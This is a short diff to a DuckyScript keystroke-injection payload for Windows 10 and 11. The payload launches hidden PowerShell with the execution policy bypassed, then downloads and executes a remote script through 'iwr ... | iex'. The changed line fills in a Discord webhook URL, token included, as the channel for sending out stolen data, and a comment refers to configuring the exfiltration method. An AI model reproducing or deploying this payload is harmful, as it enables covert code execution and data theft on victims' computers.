@@ -8,7 +8,7 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='';iwr https://link.iamjakoby.com/ovuletif | iex
+STRING powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1292675251678744630/VZbdVLqS1gvRSGSCR6W8jgAjByfIVSF185A4KTc5qo3V10ZIthGM4RvpEyM6PXO5Ziwe';iwr https://link.iamjakoby.com/ovuletif | iex
 ENTER
 
 REM     Fill in either variable or both to set your exfil method.
